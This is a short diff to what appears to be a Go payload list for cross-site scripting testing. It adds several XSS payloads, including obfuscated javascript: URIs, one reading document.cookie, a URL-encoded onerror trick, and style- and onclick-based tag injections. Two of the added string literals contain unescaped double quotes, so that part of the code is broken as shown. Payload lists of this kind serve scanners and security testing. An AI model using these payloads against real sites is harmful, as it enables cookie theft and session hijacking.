@@ -98,6 +98,12 @@ var payloads = []string{
     
     // ===== Embedded HTML inside tags =====
     "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
+
+	"javascript:top[/al/.source+/ert/.source](document.cookie)",
+	"javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain",
+	"><div style="background-image: url('javascript:alert('XSS')');"></div>",
+	"><button onclick="alert('XSS')">Click Me</button>",
+
 }
 
 
